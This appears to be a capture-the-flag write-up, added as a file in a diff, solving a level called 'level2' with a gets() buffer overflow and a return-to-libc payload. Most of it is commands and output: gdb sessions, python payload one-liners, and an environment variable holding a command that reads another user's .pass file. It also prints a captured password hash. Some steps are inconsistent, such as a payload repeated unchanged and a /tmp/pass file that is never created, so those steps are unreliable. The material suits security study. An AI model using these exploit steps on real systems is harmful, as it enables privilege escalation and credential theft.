@@ -1,0 +1,137 @@
+ll
+|
+L-> -rwsr-s---+ 1 level3 users  5403 Mar  6  2016 level2*
+
+./level2
+
+a
+|
+L-> a
+
+ok so this program wait for an input and rewrite it 
+lets objdump on it
+
+objdump -d level2
+|
+L-> 80484ed:       e8 ce fe ff ff          call   80483c0 <gets@plt>
+
+ok so the program call p() who call gets() so we can probably make another buffer overflow
+
+we also see
+
+ 80484fb:       25 00 00 00 b0          and    $0xb0000000,%eax
+ 8048500:       3d 00 00 00 b0          cmp    $0xb0000000,%eax
+
+after de call to gets(), it's means that it make a check on the len of the string returned, it first make an AND on it then check b0 in dec is 176 but in second degree it's -80
+so we can assume that the buffer overflow may be at the 80's char
+
+let's try it in gdb
+
+gdb level2
+
+(gdb) r <<< $(python -c 'print "a"*100')
+|
+L-> Program received signal SIGSEGV, Segmentation fault.
+L-> 0x61616161 in ?? ()
+
+ok so it's too long let's check with 80 that we found before
+
+(gdb) r <<< $(python -c 'print "a"*80')
+|
+L-> Program received signal SIGSEGV, Segmentation fault.
+L-> 0xb7ea912f in ?? () from /lib/i386-linux-gnu/libc.so.6
+
+here we go we overflow
+
+so now we need to get the flag so we will try to execute a system() call butt we don't see it in the program I saw a method on stackoverflow to find it's address
+let's try the method
+
+(gdb) break main
+(gdb) r
+(gdb) print system
+|
+L-> $1 = {<text variable, no debug info>} 0xb7e6b060 <system>
+
+here we go we got the adress of the system call 
+
+now we need to put a command in this system() call, we can use environnement var to get this
+let's try to define it and to find his address in gdb
+
+export EXPLOIT="cat /home/user/level3/.pass"
+
+gdb level2
+
+(gdb) break main
+(gdb) r
+(gdb) x/s *((char **)environ)
+|
+L-> 0xbffff8e7:      "EXPLOIT=cat /home/user/level3/.pass"
+
+ok so we got his address but we got enverything in the string (EXPLOIT= include)
+so let's make another var:
+
+export EXPLOIT="test; cat /home/user/level3/.pass"
+try again
+(gdb) break main
+(gdb) r
+(gdb) x/s *((char **)environ)
+|
+L-> 0xbffff8e1:      "EXPLOIT=test; cat /home/user/level3/.pass"
+
+here we go so the address change but it's not a problem because we finnaly got it, so it will make system("EXPLOIT=test; cat /home/user/level3/.pass")
+
+let's try 
+
+python -c 'print "a"*80 + "\x60\xb0\xe6\xb7" +"\xd8\xf8\xff\xbf"' | ./level2
+|
+L-> (0xb7e6b060)
+
+oh... it's only print the system() address so we can't do like this
+
+after some search and thanks to https://www.exploit-db.com/docs/english/28553-linux-classic-return-to-libc-&-return-to-libc-chaining-tutorial.pdf
+I know my error, I have to return to libc to call the system() function, otherwise it doesn't know it, and I have to put 4 random char between the system() address and our env var
+
+let's try it
+
+python -c 'print "a"*80 + "\x3e\x85\x04\x08" + "\x60\xb0\xe6\xb7"+ "1234" + "\xd8\xf8\xff\xbf"' | ./level2
+|
+L-> aa[...]
+L-> sh: 1: i686: not found
+
+i686 ?
+
+we may not get the env address as we need, I checked on internet and in C we can do a getenv("EXPLOIT") and got his %p in printf
+
+so I make a little program 
+
+int main()
+{
+    printf("%p\n", getenv("EXPLOIT"));
+}
+
+gcc /tmp/c.c -o /tmp/c 
+
+/tmp/c
+|
+L-> 0xbffff8f5
+
+ok let's try with this 
+
+python -c 'print "a"*80 + "\x3e\x85\x04\x08" + "\x60\xb0\xe6\xb7"+ "1234" + "\xf5\xf8\xff\xbf"' | ./level2
+|
+L-> sh: 1: t: not found
+
+I think we've got a problem and cat was trunc into t so we lost 2 by so let's change f5 to f3
+
+python -c 'print "a"*80 + "\x3e\x85\x04\x08" + "\x60\xb0\xe6\xb7"+ "1234" + "\xf5\xf8\xff\xbf"' | ./level2
+|
+L-> aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa>aaaaaaaaaaaa>`1234
+L-> Segmentation fault (core dumped)
+
+ok no shell error let's try to cat our /tmp/pass
+
+cat /tmp/pass
+|
+L-> 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
+
+let's go
